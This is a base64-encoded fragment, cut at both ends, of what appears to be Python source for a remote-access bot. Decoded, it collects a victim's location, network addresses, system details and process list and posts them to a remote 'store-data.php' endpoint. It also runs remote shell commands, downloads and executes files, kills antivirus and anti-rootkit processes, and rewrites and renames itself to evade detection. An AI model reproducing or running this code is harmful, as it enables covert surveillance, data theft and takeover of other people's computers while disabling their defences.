jdHlwZXMud2luZGxsLnNoZWxsMzIuSXNVc2VyQW5BZG1pbigpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaXYgPSBUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaXYgPSBGYWxzZQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdCA9IGYnJycKCiAgICA9LT0tPS09LT0tPSBHRU8gSU5GT1JNQVRJT04gPS09LT0tPS09LT0KCiAgICBDb3VudHJ5OiB7ZGF0YVsnY291bnRyeSddfQogICAgUmVnaW9uOiB7ZGF0YVsncmVnaW9uTmFtZSddfQogICAgQ2l0eToge2RhdGFbJ2NpdHknXX0KICAgIFppcDoge2RhdGFbJ3ppcCddfQogICAgTGF0aXR1ZGU6IHtkYXRhWydsYXQnXX0KICAgIExvbmdpdHVkZToge2RhdGFbJ2xvbiddfQogICAgSVNQOiB7ZGF0YVsnaXNwJ119CgogICAgPS09LT0tPS09LT0gUEFZTE9BRCBJTkZPUk1BVElPTiA9LT0tPS09LT0tPQoKICAgIFBheWxvYWQgRmlsZSBOYW1lL0xvY2F0aW9uOiB7c2NyaXB0X2RpcmVjdG9yeV9maWxlbmFtZX0KICAgIE1vc3QgUmVjZW50IEluZmVjdGlvbiBEYXRlL1RpbWU6IHtmb3JtYXQoZm9ybWF0dGVkX2RhdGV0aW1lKX0KICAgIEFkbWluL1Jvb3QgZmlsZSBwcml2aWxhZ2VzOiB7cHJpdn0KICAgIEdVSToge2d1aX0KCiAgICA9LT0tPS09LT0tPSBTWVNURU0gSU5GT1JNQVRJT04gPS09LT0tPS09LT0KCiAgICBTeXN0ZW0gSG9zdG5hbWU6IHtzeXN0ZW1faG9zdG5hbWV9CiAgICBPcGVyYXRpbmcgU3lzdGVtOiB7b3BlcmF0aW5nX3N5c3RlbX0KICAgIE9wZXJhdGluZyBTeXN0ZW0gVmVyc2lvbjoge29wZXJhdGluZ19zeXN0ZW1fdmVyc2lvbn0KCiAgICBQdWJsaWMgSVAgQWRkcmVzczoge3B1YmxpY19pcH0KICAgIFByaXZhdGUgSVAgQWRkcmVzczoge3ByaXZhdGVfaXB9CiAgICBNQUMgQWRkcmVzczoge21hY19hZGRyZXNzfQoKICAgIFN5c3RlbSBBcmNoaXRlY3R1cmU6IHtzeXN0ZW1fYXJjaGl0ZWN0dXJlfQogICAgUHJvY2Vzc29yIEJ1aWxkOiB7cHJvY2Vzc29yX2J1aWxkfQogICAgQ1BVIENvdW50OiB7Y3B1X2NvdW50fQoKICAgID0tPS09LT0tPS09IFdJTkRPV1MgSU5GT1JNQVRJT04gPS09LT0tPS09LT0KCiAgICBBdmFpbGFibGUgRHJpdmVzOiB7Y3VycmVudF9hdmFpbGFibGVfZHJpdmVzfQoKICAgIEM6IERyaXZlIFRvdGFsIFN0b3JhZ2U6IHtDdG90YWxfc3RvcmFnZX0KICAgIEM6IERyaXZlIFVzZWQgU3RvcmFnZToge0N1c2VkX3N0b3JhZ2V9CiAgICBDOiBEcml2ZSBGcmVlIFN0b3JhZ2U6IHtDZnJlZV9zdG9yYWdlfQoKICAgID0tPS09LT0tPS09IFNZU1RFTSBQUk9DRVNTRVMgPS09LT0tPS09LT0KCiAgICB7cnVubmluZ19wcm9jZXNzZXN9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnJycKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN1c3RvbV9kYXRhID0gZGF0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybCA9IHNlbmR0b3VybCsic3RvcmUtZGF0YS5waHAiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9eyJkYXRhIjogY3VzdG9tX2RhdGF9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiZGF0YSBzZW50Iix1cmwpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIEU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KEUpCgogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9ybWUgPSBGYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgICAgICAgICBlbGlmICJBTEwiIGluIGZpbmQ6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvcm1lID0gVHJ1ZQoKICAgICAgICAgICAgICAgICAgICBpZiBmb3JtZToKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICJjbWQiIGluIGZpbmQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gc3RyaW5nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oY29tbWFuZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJjbWQgZXhlYyIpCgogICAgICAgICAgICAgICAgICAgICAgICBpZiAiZWNobyIgaW4gZmluZDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSBzdHJpbmcKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGNvbW1hbmQpCgogICAgICAgICAgICAgICAgICAgICAgICBpZiAibWVzc2FnZSIgaW4gZmluZDoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmMgPSByZS5maW5kYWxsKHInXFsuKj9cXScsIGZpbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBicmMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cihzdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiXSIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiWyIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiJyIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmNrID0gc3RyaW5nCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJjaG9zdCA9IHJlLmZpbmRhbGwocidcKC4qP1wpJywgZmluZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IGJyY2hvc3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cihzdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiKSIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiKCIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiJyIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiXSIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiWyIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyY2tob3N0ID0gc3RyaW5nCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoYnJja2hvc3QsInRpdGxlIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGJyY2ssImJvZHkiKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGd1aSA9PSBUcnVlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QgPSB0ay5UaygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdC53aXRoZHJhdygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGtpbnRlci5tZXNzYWdlYm94LnNob3dpbmZvKGJyY2tob3N0LCBicmNrKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuZGVzdHJveSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICJkb3dubG9hZCIgaW4gZmluZDoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gc3RyaW5nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJzZWRfdXJsID0gdXJsbGliLnBhcnNlLnVybHBhcnNlKGNvbW1hbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlbmFtZSA9IG9zLnBhdGguYmFzZW5hbWUocGFyc2VkX3VybC5wYXRoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2F2ZV9kaXJlY3RvcnkgPSBvcy5nZXRjd2QoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWxfZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKHNhdmVfZGlyZWN0b3J5LCBmaWxlbmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybGxpYi5yZXF1ZXN0LnVybHJldHJpZXZlKGNvbW1hbmQsIGxvY2FsX2ZpbGVfcGF0aCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bmFtZSA9IHBsYXRmb3JtLnVuYW1lKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZXJhdGluZ19zeXN0ZW0gPSB1bmFtZS5zeXN0ZW0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBvcGVyYXRpbmdfc3lzdGVtID09ICdXaW5kb3dzJzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5zdGFydGZpbGUobG9jYWxfZmlsZV9wYXRoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXywgZmlsZV9leHRlbnNpb24gPSBvcy5wYXRoLnNwbGl0ZXh0KGxvY2FsX2ZpbGVfcGF0aCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZmlsZV9leHRlbnNpb24gPT0gJy5zaCc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsnYmFzaCcsIGxvY2FsX2ZpbGVfcGF0aF0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBmaWxlX2V4dGVuc2lvbiA9PSAnLnB5JzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWydweXRob24zJywgbG9jYWxfZmlsZV9wYXRoXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGlmIGZpbGVfZXh0ZW5zaW9uID09ICcuamFyJzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWydqYXZhJywgJy1qYXInLCBsb2NhbF9maWxlX3BhdGhdKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgb3MuYWNjZXNzKGxvY2FsX2ZpbGVfcGF0aCwgb3MuWF9PSyk6IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbJy4vJyArIGxvY2FsX2ZpbGVfcGF0aF0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyd4ZGctb3BlbicsIGxvY2FsX2ZpbGVfcGF0aF0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICJwcm94eSIgaW4gZmluZDoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmMgPSByZS5maW5kYWxsKHInXFsuKj9cXScsIGZpbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBicmMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cihzdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiXSIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiWyIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiJyIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmNrID0gc3RyaW5nCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJjaG9zdCA9IHJlLmZpbmRhbGwocidcKC4qP1wpJywgZmluZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IGJyY2hvc3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cihzdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiKSIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiKCIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiJyIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiXSIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiWyIsIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyY2tob3N0ID0gc3RyaW5nCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJveHkgPSAiaHR0cDovLyIrYnJja2hvc3QrIjoiK2JyY2sKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5lbnZpcm9uWydodHRwX3Byb3h5J10gPSBwcm94eQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MuZW52aXJvblsnSFRUUF9QUk9YWSddID0gcHJveHkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLmVudmlyb25bJ2h0dHBzX3Byb3h5J10gPSBwcm94eQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MuZW52aXJvblsnSFRUUFNfUFJPWFknXSA9IHByb3h5CgogICAgICAgICAgICAgICAgICAgICAgICBpZiAiZGlzYWJsZSIgaW4gZmluZDoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bmFtZSA9IHBsYXRmb3JtLnVuYW1lKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZXJhdGluZ19zeXN0ZW0gPSB1bmFtZS5zeXN0ZW0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBvcGVyYXRpbmdfc3lzdGVtID09ICdXaW5kb3dzJzoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYW50aXZpcnVzX3Byb2Nlc3NfbmFtZXMgPSBbJ2NjU3ZjSHN0LmV4ZScsICdtY3NoaWVsZC5leGUnLCAnYXZnc3ZjLmV4ZScsICdhdnAuZXhlJywgJ2JkYWdlbnQuZXhlJywgJ21iYW0uZXhlJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnU0RUcmF5LmV4ZScsICdXUlNBLmV4ZScsICdTQVZTZXJ2aWNlLmV4ZScsICdQU1VBTWFpbi5leGUnLCAnVE1CTVNSVi5leGUnLCAnZWd1aS5leGUnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdBZEF3YXJlLmV4ZScsICdTQkFNVHJheS5leGUnLCAnYXZndWFyZC5leGUnLCAnY3lsYW5jZXN2Yy5leGUnLCAnYTJndWFyZC5leGUnLCAnVjNUcmF5LmV4ZScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1NVUEVSQW50aVNweXdhcmUuZXhlJywgJ2htcGFsZXJ0LmV4ZScsICdCdWxsR3VhcmQuZXhlJywgJ1NCQU1UcmF5LmV4ZScsICcnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICczNjBUcmF5LmV4ZScsICdQU0FOSG9zdC5leGUnLCAnY2F2d3AuZXhlJywgJ2ZzYXYuZXhlJywgJ3phdHJheS5leGUnXQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBydW5uaW5nX3Byb2Nlc3NlcyA9IG9zLnBvcGVuKCd3bWljIHByb2Nlc3MgZ2V0IGRlc2NyaXB0aW9uLCBwcm9jZXNzaWQnKS5yZWFkKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZXNzX2xpbmVzID0gcnVubmluZ19wcm9jZXNzZXMuc3BsaXQoJ1xuJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBydW5uaW5nX3Byb2Nlc3NfbmFtZXMgPSBbbGluZS5zcGxpdCgpWzBdIGZvciBsaW5lIGluIHByb2Nlc3NfbGluZXMgaWYgbGluZV0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHByb2Nlc3NfbmFtZSBpbiBhbnRpdmlydXNfcHJvY2Vzc19uYW1lczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcHJvY2Vzc19uYW1lLmxvd2VyKCkgaW4gW25hbWUubG93ZXIoKSBmb3IgbmFtZSBpbiBydW5uaW5nX3Byb2Nlc3NfbmFtZXNdOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gZid0YXNra2lsbCAvRiAvSU0ge3Byb2Nlc3NfbmFtZX0nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oY29tbWFuZCwgc2hlbGw9VHJ1ZSkKCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9wZXJhdGluZ19zeXN0ZW0gPT0gJ0xpbnV4JzoKCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFudGlyb290a2l0X3Byb2Nlc3NfbmFtZXMgPSBbJ3JraHVudGVyJywgJ2Noa3Jvb3RraXQnLCAnTHluaXMnLCAnY2xhbXNjYW4nLCAnYWlkZScsICdya3Nwb3R0ZXInLCAna2phY2thbCcsICdsa3JkJywgJ2ZnJywgJ2RldGVjdGlvbi1jb250YWluZXInLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnb3NzZWMtcm9vdGNoZWNrJywgJ3RyaXB3aXJlJywgJ3NhbWhhaW4nLCAndGlnZXInLCAneWFyYScsICdjaGtwcm9jJywgJ3Jvb3RraXQgaHVudGVyJywgJ3VuaGlkZScsICdtYWxkZXQnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnc29waG9zJywgJ2NsYW1hdicsICdiaXRkZWZlbmRlcicsICdhdmdkJywgJ2F2YXN0JywgJ2Ytc2VjdXJlJywgJ2VzZXRzJywgJ21hbHdhcmVieXRlcycsICdrYXNwZXJza3knLCAnc3ltYW50ZWMnXQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgcHJvY2Vzc19uYW1lIGluIGFudGlyb290a2l0X3Byb2Nlc3NfbmFtZXM6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChbJ3doaWNoJywgcHJvY2Vzc19uYW1lXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSBmJ3BraWxsIC1mIC05IHtwcm9jZXNzX25hbWV9JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZidraWxsZWQge3Byb2Nlc3NfbmFtZX0nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKGNvbW1hbmQsIHNoZWxsPVRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNzRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IHN1YnByb2Nlc3MuQ2FsbGVkUHJvY2Vzc0Vycm9yOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICJyZWRpcmVjdCIgaW4gZmluZDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHN0cmluZwogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2ViYnJvd3Nlci5vcGVuKGNvbW1hbmQpCgogICAgICAgICAgICAgICAgICAgICAgICBpZiAib2JmdXNjYXRlIiBpbiBmaW5kOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbCBzbGVlcAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNsZWVwID0gVHJ1ZQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlcCA9IG9zLnBhdGguc2VwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChzeXMuYXJndlswXSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnZXRhdHRyKHN5cywgJ2Zyb3plbicsIEZhbHNlKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChzeXMuZXhlY3V0YWJsZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdF9kaXJlY3RvcnkgPSBvcy5wYXRoLmRpcm5hbWUoc2NyaXB0X3BhdGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JpcHRfZmlsZW5hbWUgPSBvcy5wYXRoLmJhc2VuYW1lKHNjcmlwdF9wYXRoKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWUgPSBzY3JpcHRfZGlyZWN0b3J5K3NlcCtzY3JpcHRfZmlsZW5hbWUKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWYgZ2VuZXJhdGVfcmFuZG9tX2NvZGUoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFyYWN0ZXJzID0gJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhbmRvbV9jb2RlID0gJycuam9pbihyYW5kb20uY2hvaWNlKGNoYXJhY3RlcnMpIGZvciBfIGluIHJhbmdlKHJhbmRvbS5yYW5kaW50KDUwLCAxMDApKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZicjIHtyYW5kb21fY29kZX1cbicKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oc2NyaXB0X2RpcmVjdG9yeV9maWxlbmFtZSwgJ3InKSBhcyBmZGVzYzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JpcHRfY29udGVudCA9IGZkZXNjLnJlYWQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKHNjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWUsICd3JykgYXMgZmRlc2M6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhcmFjdGVycyA9ICdhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ekFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaMDEyMzQ1Njc4OScKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByYW5kb21fY29kZSA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShjaGFyYWN0ZXJzKSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCg1MCwgMTAwKSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmRlc2Mud3JpdGUoc2NyaXB0X2NvbnRlbnQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmRlc2Mud3JpdGUoJ1xuJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmZGVzYy53cml0ZSgncHJpbnQoIicrcmFuZG9tX2NvZGUrJyIpJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmZGVzYy53cml0ZSgnXG4nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZkZXNjLndyaXRlKGdlbmVyYXRlX3JhbmRvbV9jb2RlKCkpCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSBzdHJpbmcKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aW1lX3NsZWVwID0gaW50KHN0cmluZykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdF9wYXRoID0gb3MucGF0aC5hYnNwYXRoKHN5cy5hcmd2WzBdKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdldGF0dHIoc3lzLCAnZnJvemVuJywgRmFsc2UpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdF9wYXRoID0gb3MucGF0aC5hYnNwYXRoKHN5cy5leGVjdXRhYmxlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NyaXB0X2RpcmVjdG9yeSA9IG9zLnBhdGguZGlybmFtZShzY3JpcHRfcGF0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdF9maWxlbmFtZSA9IG9zLnBhdGguYmFzZW5hbWUoc2NyaXB0X3BhdGgpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NyaXB0X2RpcmVjdG9yeV9maWxlbmFtZSA9IHNjcmlwdF9kaXJlY3Rvcnkrc2VwK3NjcmlwdF9maWxlbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NyaXB0ZHIgPSBzdHIoc2NyaXB0X2RpcmVjdG9yeSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdG5tID0gc3RyKHNjcmlwdF9maWxlbmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdGRmID0gc3RyKHNjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWUpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9leHRlbnNpb25zID0gWycudHh0JywgJy5qcGcnLCAnLnBuZycsICcuZG9jeCcsICcucGRmJ10KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByYW5kb21fZmlsZW5hbWUgPSBzdHIodXVpZC51dWlkNCgpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFuZG9tX2V4dGVuc2lvbiA9IHJhbmRvbS5jaG9pY2UoZmlsZV9leHRlbnNpb25zKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbmV3ZmlsZSA9IHJhbmRvbV9maWxlbmFtZStyYW5kb21fZXh0ZW5zaW9uCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MucmVuYW1lKHNjcmlwdGRmLG5ld2ZpbGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKHRpbWVfc2xlZXApCiAgICA